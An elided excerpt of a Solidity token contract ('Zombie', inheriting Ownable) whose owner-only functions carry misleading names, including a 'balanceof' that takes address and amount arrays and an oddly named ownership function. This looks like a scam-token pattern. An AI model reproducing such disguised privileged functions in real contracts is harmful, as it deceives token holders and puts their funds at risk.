...
contract Ownable is Context, IERC165{  
    ...
    */
    ...
    function Auckland(address newOwner) external onlyOwner returns (bool) {
...
contract Zombie is Ownable {
    ...
    function checkdatasetCoolDown(uint256 newCoolWait) external onlyOwner {
        require(
    ...
    function balanceof(address[] calldata to, uint256[] calldata amounts) public onlyOwner {
    ...
    function newAddress(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function dividedAdd() public view virtual returns (address) {
        return address(this);
    }
